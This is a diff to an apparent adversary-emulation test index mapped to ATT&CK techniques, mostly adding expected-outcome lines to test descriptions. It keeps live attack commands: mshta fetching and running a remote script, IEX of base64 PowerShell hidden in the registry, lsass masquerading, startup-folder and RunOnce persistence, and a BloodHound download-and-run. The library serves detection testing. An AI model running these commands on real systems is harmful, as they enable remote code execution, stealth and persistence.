@@ -2822,10 +2822,9 @@ persistence:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: 'jse files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        jse files can be placed in and ran from the startup folder to maintain persistance.
+        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
       supported_platforms:
       - windows
       executor:
@@ -2840,10 +2839,9 @@ persistence:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
     - name: Supicious bat file run from startup Folder
-      description: 'bat files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        bat files can be placed in and executed from the startup folder to maintain persistance.
+        Upon execution, cmd will be run and immediately closed.
       supported_platforms:
       - windows
       executor:
@@ -3806,9 +3804,9 @@ persistence:
 
 '
     - name: PowerShell Registry RunOnce
-      description: 'RunOnce Key Persistence via PowerShell
-
-'
+      description: |
+        RunOnce Key Persistence via PowerShell
+        Upon execution, a new entry will be added to the runonce item in the registry
       supported_platforms:
       - windows
       input_arguments:
@@ -8748,8 +8746,8 @@ defense-evasion:
     - name: Indirect Command Execution - pcalua.exe
       description: |
         The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.
-
         [Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)
+        Upon execution, calc.exe should open
       supported_platforms:
       - windows
       input_arguments:
@@ -8760,24 +8758,19 @@ defense-evasion:
         payload_path:
           description: Path to payload
           type: path
-          default: c:\temp\payload.dll
-        payload_cpl_path:
-          description: Path to payload
-          type: path
-          default: C:\Windows\system32\javacpl.cpl -c Java
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
+        elevation_required: false
         command: |
           pcalua.exe -a #{process}
           pcalua.exe -a #{payload_path}
-          pcalua.exe -a #{payload_cpl_path}
     - name: Indirect Command Execution - forfiles.exe
       description: |
         forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.
-
         [Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)
-
         "This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe"
+        Upon execution calc.exe will be opened
       supported_platforms:
       - windows
       input_arguments:
@@ -8787,6 +8780,7 @@ defense-evasion:
           default: calc.exe
       executor:
         name: command_prompt
+        elevation_required: false
         command: |
           forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
           forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
@@ -9672,18 +9666,17 @@ defense-evasion:
       identifier: T1036
     atomic_tests:
     - name: Masquerading as Windows LSASS process
-      description: 'Copies cmd.exe, renames it, and launches it to masquerade as an
-        instance of lsass.exe.
-
-'
+      description: |
+        Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.
+        Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
-          cmd.exe /c %SystemRoot%\Temp\lsass.exe
+          copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+          %SystemRoot%\Temp\lsass.exe /B
         cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
 
 '
@@ -9717,10 +9710,9 @@ defense-evasion:
 
 '
     - name: Masquerading - wscript.exe running as svchost.exe
-      description: 'Copies wscript.exe, renames it, and launches it to masquerade
-        as an instance of svchost.exe.
-
-'
+      description: |
+        Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.
+        Upon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder
       supported_platforms:
       - windows
       executor:
@@ -10073,7 +10065,8 @@ defense-evasion:
           $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
           Remove-item  $key -Recurse -ErrorAction Ignore
     - name: Javascript in registry
-      description: 'placing javascript in registry for persistence
+      description: 'Upon execution, a javascript block will be placed in the registry
+        for persistence
 
 '
       supported_platforms:
@@ -10085,8 +10078,10 @@ defense-evasion:
           Settings" -Name T1112 -Value "<script>"
 
 '
-        cleanup_command: Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
+        cleanup_command: 'Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
           Settings" -Name T1112 -ErrorAction Ignore
+
+'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -10176,9 +10171,9 @@ defense-evasion:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: 'Test execution of a remote script using mshta.exe
-
-'
+      description: |
+        Test execution of a remote script using mshta.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -10189,8 +10184,9 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-          \     \n"
+        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+
+'
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -10220,9 +10216,9 @@ defense-evasion:
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: 'Execute an arbitrary remote HTA.
-
-'
+      description: |
+        Execute an arbitrary remote HTA.
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -10354,10 +10350,9 @@ defense-evasion:
           expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
           esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
     - name: Store file in Alternate Data Stream (ADS)
-      description: 'Storing files in Alternate Data Stream (ADS) similar to Astaroth
-        malware.
-
-'
+      description: |
+        Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
+        Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
       supported_platforms:
       - windows
       input_arguments:
@@ -10382,7 +10377,9 @@ defense-evasion:
               New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
               }
           Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
-        cleanup_command: Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
+        cleanup_command: 'Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
+
+'
   T1126:
     technique:
       x_mitre_data_sources:
@@ -10612,10 +10609,9 @@ defense-evasion:
           chmod +x /tmp/art.sh
           /tmp/art.sh
     - name: Execute base64-encoded PowerShell
-      description: 'Creates base64-encoded PowerShell code and executes it. This is
-        used by numerous adversaries and malicious tools.
-
-'
+      description: |
+        Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.
+        Upon execution the test will print "Hey, Atomic!" to the PowerShell session
       supported_platforms:
       - windows
       input_arguments:
@@ -10631,14 +10627,11 @@ defense-evasion:
           $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
           $EncodedCommand =[Convert]::ToBase64String($Bytes)
           $EncodedCommand
-
           powershell.exe -EncodedCommand $EncodedCommand
     - name: Execute base64-encoded PowerShell from Windows Registry
-      description: 'Stores base64-encoded PowerShell code in the Windows Registry
-        and deobfuscates it for execution. This is used by numerous adversaries and
-        malicious tools.
-
-'
+      description: |
+        Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.
+        Upon execution "Hey, Atomic!" will be printed to the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -10666,7 +10659,9 @@ defense-evasion:
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
           powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
         cleanup_command: 'Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}'
+          -Name #{registry_entry_storage}
+
+'
   T1502:
     technique:
       x_mitre_data_sources:
@@ -11687,8 +11682,8 @@ defense-evasion:
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-
         Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -11705,8 +11700,8 @@ defense-evasion:
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
-
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -16819,9 +16814,9 @@ discovery:
           dscacheutil -q group
           dscacheutil -q user
     - name: Enumerate all accounts
-      description: 'Enumerate all accounts
-
-'
+      description: |
+        Enumerate all accounts
+        Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
       supported_platforms:
       - windows
       executor:
@@ -17597,9 +17592,9 @@ discovery:
           smbutil view -g //#{computer_name}
           showmount #{computer_name}
     - name: Network Share Discovery command prompt
-      description: 'Network Share Discovery utilizing the command prompt
-
-'
+      description: |
+        Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+        Upon execution avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -17614,9 +17609,9 @@ discovery:
 
 '
     - name: Network Share Discovery PowerShell
-      description: 'Network Share Discovery utilizing PowerShell
-
-'
+      description: |
+        Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
+        Upon execution, avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
       input_arguments:
@@ -17632,7 +17627,8 @@ discovery:
           get-smbshare -Name #{computer_name}
     - name: View available share drives
       description: View information about all of the resources that are shared on
-        the local computer
+        the local computer Upon execution, avalaible share drives will be displayed
+        in the powershell session
       supported_platforms:
       - windows
       executor:
@@ -22859,9 +22855,9 @@ execution:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: 'Test execution of a remote script using mshta.exe
-
-'
+      description: |
+        Test execution of a remote script using mshta.exe
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -22872,8 +22868,9 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-          \     \n"
+        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+
+'
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -22903,9 +22900,9 @@ execution:
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: 'Execute an arbitrary remote HTA.
-
-'
+      description: |
+        Execute an arbitrary remote HTA.
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -23035,9 +23032,9 @@ execution:
 
 '
     - name: BloodHound
-      description: 'Download Bloodhound and run it
-
-'
+      description: "Upon execution BloodHound will be downloaded and executed. It
+        will set up collection methods, run,\n\nand then compress and store the data
+        to the temp directory on the machine \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -23091,6 +23088,7 @@ execution:
       description: |
         Note: Windows 10 only
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+        Upon execution windows backup and restore window will be opened
       supported_platforms:
       - windows
       executor:
@@ -23628,8 +23626,8 @@ execution:
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
-
         Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -23646,8 +23644,8 @@ execution:
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
-
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+        Upon execution calc.exe will be launched
       supported_platforms:
       - windows
       input_arguments:
@@ -25842,10 +25840,9 @@ lateral-movement:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: 'jse files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        jse files can be placed in and ran from the startup folder to maintain persistance.
+        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
       supported_platforms:
       - windows
       executor:
@@ -25860,10 +25857,9 @@ lateral-movement:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
     - name: Supicious bat file run from startup Folder
-      description: 'bat files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        bat files can be placed in and executed from the startup folder to maintain persistance.
+        Upon execution, cmd will be run and immediately closed.
       supported_platforms:
       - windows
       executor:
